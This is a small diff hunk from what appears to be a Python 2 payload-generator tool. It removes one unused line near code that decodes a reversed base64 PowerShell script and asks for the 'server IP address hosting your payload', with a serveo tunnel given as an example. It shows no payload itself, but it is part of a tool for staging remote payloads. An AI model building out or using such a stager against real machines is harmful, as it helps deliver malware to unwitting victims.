@@ -62,7 +62,6 @@ def main():
 			script = scripts["pwsh_light"]
 	else:
 		print("Invalid option")
-	c = list(script)
 	lstring = base64.b64decode(script[::-1])
 	lines = lstring[1:-1].split("', '")
 	ip = raw_input("\nEnter server IP address hosting your payload (Example: facebook.serveo.net): ")
